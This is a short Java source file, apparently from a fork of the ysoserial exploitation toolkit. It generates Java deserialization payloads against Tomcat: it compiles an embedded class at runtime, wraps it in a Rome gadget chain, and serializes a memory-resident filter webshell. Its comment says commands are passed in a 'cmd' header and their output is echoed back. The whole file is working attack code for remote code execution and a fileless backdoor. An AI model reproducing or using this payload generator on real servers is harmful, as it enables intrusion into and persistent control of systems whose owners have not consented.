package ysoserial.payloads.rceecho;


import org.apache.commons.io.IOUtils;
import ysoserial.Serializer;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;
import ysoserial.payloads.memshell.FilterShell;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.JavaCompiler;

import java.io.InputStream;

// tomcat rce 回显，header : cmd=id
public class TomcatEcho3 {
    public static void main(final String[] args) throws Exception {
        Object evil = new FilterShell().getObject(RomeTools.class);
        byte[] ser = Serializer.serialize(evil);
    }
    public Object getObject(Class gadget) throws Exception {
        InputStream inputStream = TomcatEcho3.class.getClassLoader().getResourceAsStream("rce回显/Xray.java");
        byte[] b = IOUtils.toByteArray(inputStream);
        String java = new String(b);
        byte[] bytes = JavaCompiler.compile("Xray",java);
        Class c = ClassFiles.bytesAsClass(bytes);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }
}
